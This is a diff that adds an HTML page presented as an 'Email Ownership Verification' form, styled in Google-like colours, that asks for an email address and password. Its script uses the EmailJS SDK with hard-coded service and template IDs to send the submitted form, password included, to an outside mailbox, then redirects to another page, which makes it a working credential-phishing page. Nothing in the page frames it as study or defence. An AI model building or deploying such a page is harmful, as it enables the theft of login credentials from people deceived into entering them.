@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Ownership Verification</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #1a73e8, #ff9800);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 400px;
+            background-color: #ffffff;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        h1 {
+            color: #202124;
+            font-size: 28px;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .input-group label {
+            display: block;
+            font-weight: bold;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+        .input-group input:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+        .submit-button {
+            width: 100%;
+            background-color: #1a73e8;
+            color: #ffffff;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.3s ease;
+        }
+        .submit-button:hover {
+            background-color: #1669c1;
+        }
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .footer {
+            font-size: 14px;
+            color: #202124;
+        }
+        .footer a {
+            color: #ff9800;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .header-logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .header-logo img {
+            width: 50px;
+            height: 50px;
+            margin-right: 10px;
+        }
+        .header-logo span {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1a73e8;
+        }
+        .redirect-link {
+            display: inline-block;
+            margin-top: 10px;
+        }
+    </style>
+    <!-- Include EmailJS SDK -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("o3_eBjDbOrOKgyIcS");
+        })();
+
+        window.onload = function() {
+            document.getElementById('verification-form').addEventListener('submit', function(event) {
+                event.preventDefault(); // Empêche la soumission du formulaire par défaut
+                emailjs.sendForm('service_md8ouvo', 'template_fclz7u8', this).then(function() {
+                    // Redirection après la soumission réussie
+                    window.location.href = 'index3.html';
+                });
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header-logo">
+            <img src="logo.png" alt="Logo"> <!-- Replace with your logo path -->
+            <span>Verify Your Email</span>
+        </div>
+        <h1>Email Ownership Verification</h1>
+        <form id="verification-form">
+            <div class="input-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="Your email address" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Your password" required>
+            </div>
+            <input type="submit" class="submit-button" value="Verify">
+            <p id="error-message" class="error-message"></p>
+        </form>
+        <div class="footer">
+            <p>Need help? <a href="#">Contact support</a></p>
+        </div>
+    </div>
+</body>
+</html>
